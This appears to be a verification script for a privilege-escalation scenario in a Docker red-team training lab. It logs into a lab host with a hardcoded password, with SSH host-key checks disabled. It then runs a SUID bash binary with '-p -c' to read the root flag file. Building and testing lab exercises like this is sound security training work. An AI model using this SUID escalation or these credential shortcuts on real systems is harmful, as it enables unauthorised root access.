#!/usr/bin/env bash
# Note: deliberately not using `pipefail` here. `grep -q` exits as soon as it
# finds a match, which can close the pipe while the producer (ssh/exec
# inside `docker exec`) is still writing later lines; under pipefail that
# SIGPIPE becomes the pipeline's exit status even though grep matched. The
# grep exit code alone is what these checks care about. (Same gotcha
# documented in scenarios/01-recon/verify.sh and scenarios/03-services/verify.sh.)
set -eu
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }
SSH="sshpass -p lowpriv ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null lowpriv@172.28.0.40"

docker exec redteam-lab-attacker bash -lc "command -v sshpass" >/dev/null \
  || fail "sshpass missing on attacker (it is in Task 2's Dockerfile — rebuild)"

# The default path is SUID bash: exploit and read root flag.
A "$SSH 'ls -l /usr/local/bin/backup && /usr/local/bin/backup -p -c \"cat /root/flag.txt\"'" \
  | grep -q "PRIVESC-FLAG" || fail "suid privesc did not yield root flag"

echo "PASS: 04-privesc"
